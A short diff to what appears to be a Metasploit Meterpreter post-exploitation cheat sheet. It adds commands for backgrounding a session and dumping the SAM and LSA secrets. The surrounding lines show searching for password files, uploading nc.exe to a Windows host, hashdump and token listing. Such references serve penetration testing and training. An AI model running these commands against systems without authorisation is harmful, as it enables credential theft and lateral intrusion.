@@ -479,6 +479,7 @@ msf6 > use multi/manage/autoroute
 ```
 meterpreter > sysinfo
 meterpreter > getuid
+meterpreter > background
 meterpreter > search -f *pass*.txt
 meterpreter > upload /usr/share/windows-binaries/nc.exe c:\\Users\\Public
 meterpreter > download c:\\Windows\\system32\\calc.exe /tmp/calc.exe
@@ -486,6 +487,8 @@ meterpreter > shell
 meterpreter > getprivs
 meterpreter > use priv
 meterpreter > hashdump
+meterpreter > lsa_dump_sam
+meterpreter > lsa_dump_secrets
 meterpreter > use incognito
 meterpreter > list_tokens -u
 meterpreter > list_tokens -g
